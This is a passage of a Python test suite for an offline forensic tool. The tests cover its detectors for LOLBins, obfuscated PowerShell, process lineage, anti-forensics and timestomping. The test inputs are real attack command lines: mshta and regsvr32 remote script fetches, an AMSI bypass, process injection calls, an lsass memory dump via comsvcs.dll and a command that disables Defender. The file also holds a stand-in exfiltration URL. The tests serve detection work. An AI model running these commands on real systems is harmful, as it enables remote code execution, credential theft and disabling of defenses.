    def test_old_package_without_new_fields_still_analyzes(self):
        # the single-host sample (WEB-03) has no logon_type/src_ip/src_host fields
        ev, _ = load_package(PKG)
        assert all("src_ip" in e for e in ev.events)          # normalized in, defaulting to ""
        assert all(e["src_ip"] == "" for e in ev.events)      # absent in the old package
        recon = build_reconstruction(ev)
        assert recon["root_cause_confidence"] == "high"       # single-host analysis unchanged

    def test_egress_guard_still_blocks_remote(self, monkeypatch):
        monkeypatch.delenv("AFA_ALLOW_EGRESS", raising=False)
        with pytest.raises(EgressBlocked):
            assert_local("https://api.anthropic.com/v1/messages")


# ============================================================================
# Detection Depth — fileless / LOLBin / lineage / anti-forensics / deleted-MFT.
# Each detector is deterministic, carries provenance (host + event/artifact), is
# air-gapped (base64 decode is local; the LOLBin ruleset is static in-repo), and
# is wired into ATT&CK + root cause. Tests prove it finds the real artifact AND
# stays quiet on its absence, exactly like the rest of the suite.
# ============================================================================
from afa.tools import (analyze_command_intent, detect_lineage_anomalies, detect_lolbins,
                       detect_timestomping)

# event keys the strict ATT&CK rules index directly; an inline event must carry them.
_EK = ("ts", "event_id", "channel", "computer", "user", "process", "parent_process",
       "cmdline", "dst_ip", "detail")


def _evt(**kw):
    base = {k: "" for k in _EK}
    base["event_id"] = 0
    base.update(kw)
    return base


def _ev_cmd(cmdline, process="", parent="", **kw):
    """An Evidence carrying a single 4688 command-line event (all keys present)."""
    return Evidence(host_name="EVAS-1", events=[_evt(
        event_id=4688, computer="EVAS-1", ts="2026-05-02T10:00:00Z",
        process=process, parent_process=parent, cmdline=cmdline, detail="")])


class TestLolbinDetection:
    def test_certutil_download_detected_from_sample(self):
        ev, _ = load_package(PKG)
        r = detect_lolbins(ev)
        certutil = [i for i in r["items"] if i["binary"] == "certutil"]
        assert certutil and "T1105" in certutil[0]["techniques"]
        assert "198.51.100.23" in certutil[0]["command"]      # provenance: the real cmdline
        assert "WEB-03" in certutil[0]["provenance"] and "event 4688" in certutil[0]["provenance"]

    def test_mshta_and_regsvr32_squiblydoo(self):
        mshta = detect_lolbins(_ev_cmd("mshta.exe http://198.51.100.50/a.hta", "mshta.exe"))
        assert mshta["items"][0]["binary"] == "mshta" and "T1218.005" in mshta["items"][0]["techniques"]
        sq = detect_lolbins(_ev_cmd('regsvr32 /s /u /i:http://198.51.100.50/a.sct scrobj.dll', "regsvr32.exe"))
        techs = sq["items"][0]["techniques"]
        assert "T1218.010" in techs and "T1105" in techs      # squiblydoo + remote fetch

    def test_lolbin_mapped_into_attack_matrix(self):
        ids = {t["id"] for t in map_attack(load_package(PKG)[0])["techniques"]}
        assert {"T1105", "T1140"} <= ids                       # certutil download + decode/deobf

    def test_clean_signed_binary_use_is_not_flagged(self):
        # certutil used benignly (no urlcache/decode/http) must not trip the rule
        assert detect_lolbins(_ev_cmd("certutil.exe -hashfile C:\\Windows\\notepad.exe SHA256"))["count"] == 0
        assert detect_lolbins(Evidence(host_name="CLEAN"))["count"] == 0


class TestCommandIntentDeobfuscation:
    def test_encodedcommand_is_decoded_and_classified(self):
        ev, _ = load_package(PKG)
        r = analyze_command_intent(ev)
        assert r["decoded_count"] >= 1
        cradle = [i for i in r["items"] if "download_cradle" in i["intent"] and i["decoded"]]
        assert cradle, "the -EncodedCommand cradle should decode and classify"
        c = cradle[0]
        assert "downloadstring" in c["decoded"].lower() and "198.51.100.23" in c["decoded"]
        assert c["obfuscated"] and "base64-encoded command" in c["obfuscation"]
        assert "T1140" in c["techniques"] and "T1105" in c["techniques"]
        assert "WEB-03" in c["provenance"]

    def test_intent_maps_to_deobfuscation_and_obfuscation_techniques(self):
        ids = {t["id"] for t in map_attack(load_package(PKG)[0])["techniques"]}
        assert {"T1027", "T1140"} <= ids

    def test_amsi_bypass_and_injection_intent(self):
        amsi = analyze_command_intent(_ev_cmd(
            "powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "powershell.exe"))
        assert any("T1562.001" in i["techniques"] for i in amsi["items"])
        inj = analyze_command_intent(_ev_cmd(
            "powershell $x=VirtualAlloc(0,0x1000,0x3000,0x40); WriteProcessMemory(...)", "powershell.exe"))
        assert any("T1055" in i["techniques"] for i in inj["items"])

    def test_clean_command_no_false_positive(self):
        assert analyze_command_intent(_ev_cmd("ipconfig /all", "ipconfig.exe"))["count"] == 0
        assert analyze_command_intent(_ev_cmd("cmd /c dir C:\\Users", "cmd.exe"))["count"] == 0


class TestLineageAnomalies:
    def test_office_spawning_powershell_is_flagged(self):
        ev = _ev_cmd("powershell -enc AAAA", "powershell.exe", parent="winword.exe")
        r = detect_lineage_anomalies(ev)
        assert r["count"] == 1
        assert "T1566.001" in r["items"][0]["techniques"]
        assert "winword.exe" in r["items"][0]["provenance"] and "EVAS-1" in r["items"][0]["provenance"]

    def test_web_server_spawning_shell_in_sample(self):
        ev, _ = load_package(PKG)                              # WEB-03 has w3wp.exe -> cmd.exe
        r = detect_lineage_anomalies(ev)
        ws = [i for i in r["items"] if i["parent"] == "w3wp.exe"]
        assert ws and "T1059.003" in ws[0]["techniques"]

    def test_lsass_access_is_credential_dumping(self):
        ev = _ev_cmd("rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 lsass.dmp full",
                     "rundll32.exe")
        r = detect_lineage_anomalies(ev)
        assert any("T1003.001" in i["techniques"] for i in r["items"])

    def test_normal_lineage_is_not_flagged(self):
        ev = Evidence(host_name="N", processes=[
            {"pid": 10, "ppid": 4, "name": "explorer.exe", "path": "", "cmdline": "explorer.exe"},
            {"pid": 11, "ppid": 10, "name": "chrome.exe", "path": "", "cmdline": "chrome.exe"}])
        assert detect_lineage_anomalies(ev)["count"] == 0


class TestAntiForensicsDeepened:
    def test_vss_usn_and_log_clear_each_flagged_and_mapped(self):
        ev, _ = load_package(PKG)
        af = detect_antiforensics(ev)
        labels = {i["label"] for i in af["items"]}
        assert any("VSS shadow-copy deletion" == l for l in labels)
        assert any("USN change-journal deletion" == l for l in labels)
        assert any("cleared" in l.lower() for l in labels)
        # provenance: every finding names its source row
        assert all(i["provenance"] for i in af["items"])
        ids = {t["id"] for t in map_attack(ev)["techniques"]}
        assert {"T1490", "T1070", "T1070.001"} <= ids          # recovery-inhibit, USN, log-clear

    def test_defender_tampering_mapped(self):
        ids = {t["id"] for t in map_attack(load_package(PKG)[0])["techniques"]}
        assert "T1562.001" in ids
        r = detect_antiforensics(_ev_cmd(
            "powershell Set-MpPreference -DisableRealtimeMonitoring $true", "powershell.exe"))
        assert any("T1562.001" in i["techniques"] for i in r["items"])

    def test_blind_spot_window_reported_into_rootcause_gaps(self):
        recon = build_reconstruction(load_package(PKG)[0])
        gaps = recon["gaps"]
        assert any("Visibility gap" in g and "before this are unavailable" in g for g in gaps)
        assert any("Shadow Copies were deleted" in g for g in gaps)
        assert any("USN change journal was deleted" in g for g in gaps)

    def test_clean_host_has_no_antiforensics(self):
        assert detect_antiforensics(Evidence(host_name="CLEAN"))["count"] == 0


class TestTimestompDetection:
    def test_si_before_fn_is_flagged(self):
        ev, _ = load_package(PKG)
        r = detect_timestomping(ev)
        assert r["count"] == 1
        item = r["items"][0]
        assert item["path"].lower().endswith("update.sys")
        assert any("precedes FN-created" in why for why in item["reasons"])
        assert "T1070.006" in item["techniques"]
        assert "update.sys" in item["provenance"]

    def test_normal_row_is_not_flagged(self):
        ev = Evidence(host_name="N", filesystem=[{
            "path": "C:\\x.txt", "name": "x.txt",
            "created": "2026-05-02T09:00:00Z", "modified": "2026-05-02T09:00:00Z",
            "fn_created": "2026-05-02T09:00:00Z", "fn_modified": "2026-05-02T09:00:00Z"}])
        assert detect_timestomping(ev)["count"] == 0

    def test_absent_fn_timestamps_no_crash_no_false_positive(self):
        # rows without $FILE_NAME (0x30) data — older packages / generic listing
        ev = Evidence(host_name="N", filesystem=[{
            "path": "C:\\Users\\Public\\evil.exe", "name": "evil.exe",
            "created": "2009-01-01T00:00:00Z", "modified": "2009-01-01T00:00:00Z"}])
        assert detect_timestomping(ev)["count"] == 0           # cannot compare -> skip, no FP
        assert "T1070.006" not in {t["id"] for t in map_attack(ev)["techniques"]}

    def test_timestomp_mapped_and_in_rootcause_gaps(self):
        recon = build_reconstruction(load_package(PKG)[0])
        assert "T1070.006" in {t["id"] for t in map_attack(load_package(PKG)[0])["techniques"]}
        assert any("Timestomping detected" in g for g in recon["gaps"])


class TestDeletedMftRecords:
    def test_inuse_false_record_is_flagged_deleted(self):
        ev, _ = load_package(PKG)
        ft = filesystem_timeline(ev)
        assert ft["deleted_count"] >= 1
        del_paths = [d["path"] for d in ft["deleted_suspicious"]]
        assert any(p.lower().endswith("stage2.exe") for p in del_paths)
        # tied to anti-forensics (file deletion) in the ATT&CK matrix
        assert "T1070.004" in {t["id"] for t in map_attack(ev)["techniques"]}
        # and surfaced as a deleted-dropper IOC + gap in root cause
        recon = build_reconstruction(ev)
        assert any("stage2.exe" in p for p in recon["iocs"]["suspicious_paths"])
        assert any("Deleted $MFT record" in g for g in recon["gaps"])

    def test_inuse_column_parsed_from_mftecmd_csv(self, tmp_path):
        p = tmp_path / "mft.csv"
        p.write_text("ParentPath,FileName,Created0x10,Created0x30,FileSize,InUse\n"
                     "C:\\Users\\Public,gone.exe,2026-05-02 09:11:50,2026-05-02 09:11:50,4096,False\n"
                     "C:\\Users\\Public,here.exe,2026-05-02 09:11:50,2026-05-02 09:11:50,4096,True\n")
        rows = normalize_mft(p)
        gone = next(r for r in rows if r["name"] == "gone.exe")
        here = next(r for r in rows if r["name"] == "here.exe")
        assert gone["deleted"] is True and here["deleted"] is False
        assert gone["fn_created"].startswith("2026-05-02T09:11")   # 0x30 carried through

    def test_absent_inuse_defaults_to_not_deleted(self, tmp_path):
        p = tmp_path / "mft.csv"
        p.write_text("ParentPath,FileName,Created0x10,FileSize\n"
                     "C:\\Users\\Public,x.exe,2026-05-02 09:11:50,4096\n")
        rows = normalize_mft(p)
        assert rows[0]["deleted"] is False                     # no InUse column -> default False
        assert rows[0]["fn_created"] == ""                     # no 0x30 -> empty, no crash


class TestDetectionDepthProvenanceAndGrounding:
    def test_every_detector_finding_carries_provenance(self):
        ev, _ = load_package(PKG)
        for tool in (detect_lolbins, analyze_command_intent, detect_lineage_anomalies,
                     detect_timestomping, detect_antiforensics):
            for item in tool(ev)["items"]:
                assert item.get("provenance"), f"{tool.__name__} finding lacks provenance"

    def test_new_tools_are_registered_for_the_agent(self):
        from afa.tools import tool_names, tool_specs
        names = set(tool_names())
        assert {"detect_lolbins", "analyze_command_intent", "detect_lineage_anomalies",
                "detect_timestomping"} <= names
        spec_names = {s["function"]["name"] for s in tool_specs()}
        assert "detect_lolbins" in spec_names

    def test_offline_planner_routes_to_new_detectors_and_stays_grounded(self):
        p = OfflinePlanner()
        for q, tool in [("Was there any LOLBin / certutil abuse?", "detect_lolbins"),
                        ("Decode the obfuscated PowerShell command", "analyze_command_intent"),
                        ("Any anomalous process lineage?", "detect_lineage_anomalies"),
                        ("Was any file timestomped?", "detect_timestomping"),
                        ("Did they delete shadow copies?", "detect_antiforensics")]:
            a = p.investigate(q, load_package(PKG)[0])
            assert a.grounded and any(t.name == tool for t in a.tool_calls), q

    def test_clean_host_yields_none_of_the_new_techniques(self):
        ids = {t["id"] for t in map_attack(Evidence(host_name="CLEAN-DD"))["techniques"]}
        new = {"T1218", "T1218.005", "T1218.010", "T1047", "T1140", "T1027", "T1055",
               "T1490", "T1070", "T1070.004", "T1070.006", "T1566.001", "T1003.001"}
        assert not (new & ids)


class TestDetectionDepthBackwardCompat:
    def test_package_without_scriptblocks_or_fn_still_analyzes(self):
        # a minimal package: no 4104 logs, no FN timestamps, no InUse column
        ev = Evidence(
            host_name="OLD-1",
            events=[_evt(event_id=4688, computer="OLD-1", ts="2026-01-01T00:00:00Z",
                         process="cmd.exe", cmdline="cmd /c whoami")],
            filesystem=[{"path": "C:\\Users\\Public\\a.exe", "name": "a.exe",
                         "created": "2026-01-01T00:00:00Z", "modified": "2026-01-01T00:00:00Z"}])
        # detectors degrade gracefully — fewer findings, never a crash
        assert detect_timestomping(ev)["count"] == 0
        assert filesystem_timeline(ev)["deleted_count"] == 0
        assert analyze_command_intent(ev)["count"] == 0
        recon = build_reconstruction(ev)                       # must not raise
        assert "gaps" in recon
        build_brief(ev)                                        # must not raise

    def test_egress_guard_unaffected_by_detection_depth(self, monkeypatch):
        monkeypatch.delenv("AFA_ALLOW_EGRESS", raising=False)
        with pytest.raises(EgressBlocked):
            assert_local("https://evil.example.test/exfil")
